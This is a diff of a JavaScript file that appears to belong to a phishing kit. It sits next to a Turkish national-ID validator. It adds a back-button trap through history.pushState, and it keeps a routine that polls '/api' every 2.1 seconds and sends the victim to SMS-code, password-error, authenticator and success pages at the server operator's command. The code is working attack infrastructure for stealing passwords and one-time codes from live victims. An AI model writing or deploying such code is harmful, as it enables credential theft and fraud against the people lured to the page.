@@ -64,51 +64,50 @@ function tcno_dogrula(tcno) {
     }
   });
 
-
-
-  
-function sendUrlPath() {
-  const currentPath = window.location.pathname + window.location.search;
-  const xhr = new XMLHttpRequest();
-  xhr.open("POST", "/api", true);
-  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-  
-  xhr.onreadystatechange = function () {
-      if (xhr.readyState === 4 && xhr.status === 200) {
-          const responseText = xhr.responseText.trim();
-          switch (responseText) {
-              case "sms":
-                  window.location.href = '/sms';
-                  break;
-              case "hata":
-                  window.location.href = '/sms-error';
-                  break;
-              case "sms2":
-                  window.location.href = '/error-number';
-                  break;
-              case "sifrehata":
-                  window.location.href = '/password-error';
-                  break;
-              case "back":
-                  window.location.href = '/email-error';
-                  break;
-              case "postakod":
-                  window.location.href = '/mail';
-                  break;
-              case "google":
-                  window.location.href = '/authenticator';
-                  break;
-              case "tebrik":
-                  window.location.href = '/successfuly';
-                  break;
-              default:
-          }
-      }
-  };
-  
-  xhr.send(`x=${encodeURIComponent(currentPath)}`);
-}
-
-
-
+   history.pushState(null, null, window.location.href);
+  window.addEventListener("popstate", function () {
+    history.pushState(null, null, window.location.href);
+  });
+ 
+  function sendUrlPath() {
+    const currentPath = window.location.pathname + window.location.search;
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", "/api", true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState === 4 && xhr.status === 200) {
+            const responseText = xhr.responseText.trim();
+            switch (responseText) {
+                case "sms":
+                    window.location.href = '/sms';
+                    break;
+                case "hata":
+                    window.location.href = '/sms-error';
+                    break;
+                case "sms2":
+                    window.location.href = '/error-number';
+                    break;
+                case "sifrehata":
+                    window.location.href = '/password-error';
+                    break;
+                case "back":
+                    window.location.href = '/email-error';
+                    break;
+                case "postakod":
+                    window.location.href = '/mail';
+                    break;
+                case "google":
+                    window.location.href = '/authenticator';
+                    break;
+                case "tebrik":
+                    window.location.href = '/successfuly';
+                    break;
+                default:
+            }
+        }
+    };
+    xhr.send(`x=${encodeURIComponent(currentPath)}`);
+} 
 setInterval(sendUrlPath, 2100);
+   
